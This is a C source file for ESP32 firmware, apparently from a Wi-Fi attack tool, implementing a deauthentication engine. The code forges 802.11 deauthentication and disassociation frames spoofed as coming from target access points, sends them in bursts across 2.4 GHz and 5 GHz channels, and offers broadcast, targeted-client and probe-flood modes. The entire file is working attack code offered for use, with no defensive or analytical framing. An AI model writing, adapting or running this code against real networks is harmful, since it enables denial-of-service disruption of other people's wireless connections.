#include "deauth_engine.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "deauth_eng";

#define BURST_24                30
#define BURST_5                 50
#define CHANNEL_SWITCH_DELAY_MS 12
#define TARGET_BURST_DELAY_MS   1
#define BAND_SWITCH_DELAY_MS    5
#define PROBE_BURST             40
#define PROBE_GAP_MS            8

typedef struct {
    uint8_t  bssid[6];
    uint8_t  channel;
    uint32_t packets_sent;
    bool     active;
} eng_target_t;

typedef struct {
    eng_target_t targets[DEAUTH_MAX_TARGETS];
    uint16_t     count;
} target_list_t;

typedef struct {
    uint8_t  frame_ctrl[2];
    uint8_t  duration[2];
    uint8_t  da[6];
    uint8_t  sa[6];
    uint8_t  bssid[6];
    uint8_t  seq[2];
    uint8_t  reason[2];
} __attribute__((packed)) deauth_frame_t;

typedef enum {
    ENG_ATTACK_BROADCAST = 0,
    ENG_ATTACK_TARGETED,
    ENG_ATTACK_PROBE,
} eng_attack_kind_t;

static const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static const uint16_t deauth_reasons[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 16, 17, 18, 19, 22, 23, 39, 45, 46, 47,
};
static const uint8_t num_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);

static volatile bool     running          = false;
static bool              promisc_for_tx   = false;
static bool              use_disassoc     = false;
static eng_attack_kind_t attack_kind      = ENG_ATTACK_BROADCAST;
static uint8_t           targeted_client[6];
static char              probe_ssid[33];
static TaskHandle_t      task_h           = NULL;
static int64_t           start_us         = 0;
static volatile uint32_t total_frames     = 0;
static target_list_t     attack_list;

static uint16_t seq_num = 0;

static void send_mgmt_frame(const uint8_t *ap_mac, const uint8_t *dest_mac,
                            uint16_t reason, bool disassoc, bool count_stats) {
    deauth_frame_t frame = {
        .frame_ctrl = { disassoc ? (uint8_t)0xA0 : (uint8_t)0xC0, 0x00 },
        .duration   = {0x00, 0x00},
    };
    memcpy(frame.da,    dest_mac, 6);
    memcpy(frame.sa,    ap_mac,   6);
    memcpy(frame.bssid, ap_mac,   6);

    frame.seq[0] = (seq_num << 4) & 0xF0;
    frame.seq[1] = (seq_num >> 4) & 0xFF;
    seq_num++;

    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;

    if (esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false) == ESP_OK) {
        if (count_stats) total_frames++;
    }
}

static bool send_probe_frame(const uint8_t *src_mac, const char *ssid,
                             bool count_stats) {
    static const uint8_t rates[8] =
        {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};

    const char *name = ssid ? ssid : "";
    size_t slen = strlen(name);
    if (slen > 32) slen = 32;

    uint8_t frame[64];
    size_t off = 0;

    frame[off++] = 0x40;
    frame[off++] = 0x00;
    frame[off++] = 0x00;
    frame[off++] = 0x00;
    memcpy(frame + off, broadcast_mac, 6);
    off += 6;
    memcpy(frame + off, src_mac, 6);
    off += 6;
    memcpy(frame + off, broadcast_mac, 6);
    off += 6;
    frame[off++] = (seq_num << 4) & 0xF0;
    frame[off++] = (seq_num >> 4) & 0xFF;
    seq_num++;

    frame[off++] = 0x00;            // SSID tag
    frame[off++] = (uint8_t)slen;
    if (slen > 0) {
        memcpy(frame + off, name, slen);
        off += slen;
    }

    frame[off++] = 0x01;            // Supported rates
    frame[off++] = 0x08;
    memcpy(frame + off, rates, sizeof(rates));
    off += sizeof(rates);

    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false) == ESP_OK) {
        if (count_stats) total_frames++;
        return true;
    }
    return false;
}

static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz,
                        bool targeted) {
    if (list->count == 0) return;

    uint8_t channels[DEAUTH_MAX_TARGETS];
    uint8_t num_channels = 0;

    for (int i = 0; i < list->count; i++) {
        uint8_t ch = list->targets[i].channel;
        bool found = false;
        for (int j = 0; j < num_channels; j++) {
            if (channels[j] == ch) { found = true; break; }
        }
        if (!found) channels[num_channels++] = ch;
    }

    for (int c = 0; c < num_channels; c++) {
        esp_wifi_set_channel(channels[c], WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

        for (int t = 0; t < list->count; t++) {
            eng_target_t *target = &list->targets[t];
            if (!target->active || target->channel != channels[c]) continue;

            for (int i = 0; i < burst_size; i++) {
                const uint8_t *dest = broadcast_mac;
                if (targeted && (i & 1)) {
                    dest = targeted_client;
                }
                send_mgmt_frame(target->bssid,
                                dest,
                                deauth_reasons[i % num_reasons],
                                use_disassoc,
                                true);
                target->packets_sent++;

                if (i % 8 == 7 && is_5ghz) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
            vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
        }
    }
}

static void probe_band(target_list_t *list, const uint8_t *src_mac) {
    if (list->count == 0) return;

    for (int t = 0; t < list->count; t++) {
        eng_target_t *target = &list->targets[t];
        if (!target->active) continue;

        esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

        for (int i = 0; i < PROBE_BURST; i++) {
            send_probe_frame(src_mac, probe_ssid, true);
            target->packets_sent++;
            if (PROBE_GAP_MS > 0 && i + 1 < PROBE_BURST) {
                vTaskDelay(pdMS_TO_TICKS(PROBE_GAP_MS));
            }
        }
    }
}

static void attack_task(void *arg) {
    target_list_t list_24 = {0};
    target_list_t list_5  = {0};
    target_list_t *src    = (target_list_t *)arg;

    for (int i = 0; i < src->count; i++) {
        if (src->targets[i].channel <= 14) {
            list_24.targets[list_24.count++] = src->targets[i];
        } else {
            list_5.targets[list_5.count++] = src->targets[i];
        }
    }

    uint8_t src_mac[6] = {0};
    esp_wifi_get_mac(WIFI_IF_STA, src_mac);

    const char *kind = attack_kind == ENG_ATTACK_PROBE ? "probe flood"
                     : attack_kind == ENG_ATTACK_TARGETED ? "targeted"
                     : use_disassoc ? "disassoc" : "broadcast";
    ESP_LOGI(TAG, "Attack started (%s): %u targets (%u 2.4G, %u 5G)",
             kind, (unsigned)src->count, (unsigned)list_24.count,
             (unsigned)list_5.count);

    uint32_t cycle = 0;
    uint32_t last_log = 0;

    while (running) {
        if (attack_kind == ENG_ATTACK_PROBE) {
            if (list_24.count > 0) {
                probe_band(&list_24, src_mac);
                vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
            }
            if (list_5.count > 0) {
                probe_band(&list_5, src_mac);
                vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
            }
        } else {
            bool targeted = (attack_kind == ENG_ATTACK_TARGETED);
            if (list_24.count > 0) {
                attack_band(&list_24, BURST_24, false, targeted);
                vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
            }
            if (list_5.count > 0) {
                attack_band(&list_5, BURST_5, true, targeted);
                vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
            }
        }

        cycle++;
        uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000000LL);
        if (elapsed - last_log >= 2) {
            last_log = elapsed;
            uint32_t pps = elapsed > 0 ? total_frames / elapsed : 0;
            ESP_LOGI(TAG, "[%lus] %lu pkt | ~%lu pps | cycles %lu",
                     (unsigned long)elapsed, (unsigned long)total_frames,
                     (unsigned long)pps, (unsigned long)cycle);
        }
    }

    if (promisc_for_tx) {
        esp_wifi_set_promiscuous(false);
        promisc_for_tx = false;
    }

    task_h = NULL;
    vTaskDelete(NULL);
}

static void begin_attack(const deauth_target_t *targets, uint16_t count,
                         eng_attack_kind_t kind) {
    if (!targets || count == 0) return;
    if (running) deauth_engine_stop();

    if (count > DEAUTH_MAX_TARGETS) count = DEAUTH_MAX_TARGETS;

    attack_kind = kind;
    memset(&attack_list, 0, sizeof(attack_list));
    for (uint16_t i = 0; i < count; i++) {
        memcpy(attack_list.targets[i].bssid, targets[i].bssid, 6);
        attack_list.targets[i].channel = targets[i].channel;
        attack_list.targets[i].active  = true;
    }
    attack_list.count = count;

    esp_err_t ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Promiscuous enable failed: %s", esp_err_to_name(ret));
    } else {
        promisc_for_tx = true;
    }

    total_frames = 0;
    seq_num      = 0;
    start_us     = esp_timer_get_time();
    running      = true;

    xTaskCreate(attack_task, "deauth_eng", 8192, &attack_list, 6, &task_h);
}

void deauth_engine_init(void) {
    ESP_LOGI(TAG, "Deauth engine ready");
}

void deauth_engine_set_mode(bool disassoc) {
    use_disassoc = disassoc;
}

void deauth_engine_start(const deauth_target_t *targets, uint16_t count) {
    begin_attack(targets, count, ENG_ATTACK_BROADCAST);
}

void deauth_engine_start_targeted(const deauth_target_t *ap,
                                  const uint8_t client_mac[6]) {
    if (!ap || !client_mac) return;
    memcpy(targeted_client, client_mac, 6);
    begin_attack(ap, 1, ENG_ATTACK_TARGETED);
}

void deauth_engine_start_probe_flood(const deauth_target_t *ap,
                                     const char *ssid) {
    if (!ap) return;
    strncpy(probe_ssid, ssid ? ssid : "", 32);
    probe_ssid[32] = '\0';
    begin_attack(ap, 1, ENG_ATTACK_PROBE);
}

void deauth_engine_stop(void) {
    if (!running && !task_h) return;
    running = false;

    for (int i = 0; i < 100 && task_h != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    if (promisc_for_tx) {
        esp_wifi_set_promiscuous(false);
        promisc_for_tx = false;
    }

    ESP_LOGI(TAG, "Attack stopped: %lu frames", (unsigned long)total_frames);
}

bool deauth_engine_is_running(void) {
    return running;
}

uint32_t deauth_engine_get_frames(void) {
    return total_frames;
}

uint32_t deauth_engine_get_pps(void) {
    if (!running || start_us == 0) return 0;
    int64_t elapsed = (esp_timer_get_time() - start_us) / 1000000LL;
    if (elapsed < 1) elapsed = 1;
    return total_frames / (uint32_t)elapsed;
}

uint16_t deauth_engine_burst(const uint8_t bssid[6], uint8_t channel,
                             const uint8_t *client_mac, uint16_t frame_count,
                             uint16_t gap_ms) {
    if (!bssid || frame_count == 0) return 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint16_t sent = 0;
    for (uint16_t i = 0; i < frame_count; i++) {
        const uint8_t *dest = broadcast_mac;
        if (client_mac && (i & 1)) {
            dest = client_mac;
        }
        send_mgmt_frame(bssid, dest, deauth_reasons[i % num_reasons],
                        use_disassoc, false);
        sent++;
        if (gap_ms > 0 && i + 1 < frame_count) {
            vTaskDelay(pdMS_TO_TICKS(gap_ms));
        }
    }
    return sent;
}

uint16_t deauth_engine_probe_flood(const uint8_t *src_mac, const char *ssid,
                                     uint8_t channel, uint16_t count,
                                     uint16_t gap_ms) {
    if (!src_mac || count == 0) return 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint16_t sent = 0;
    for (uint16_t i = 0; i < count; i++) {
        if (send_probe_frame(src_mac, ssid, false)) {
            sent++;
        }
        if (gap_ms > 0 && i + 1 < count) {
            vTaskDelay(pdMS_TO_TICKS(gap_ms));
        }
    }
    return sent;
}
